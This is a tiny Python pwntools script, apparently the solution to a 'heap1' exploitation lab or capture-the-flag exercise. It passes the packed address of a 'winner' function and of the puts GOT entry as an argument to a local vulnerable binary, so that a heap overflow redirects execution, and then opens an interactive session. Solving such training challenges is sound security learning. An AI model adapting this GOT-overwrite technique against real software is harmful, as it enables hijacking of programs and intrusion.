from pwn import *

winner = p32(0x080484b6)
puts = p32(0x804a018)

p = process(["./heap1", puts + winner])
p.interactive()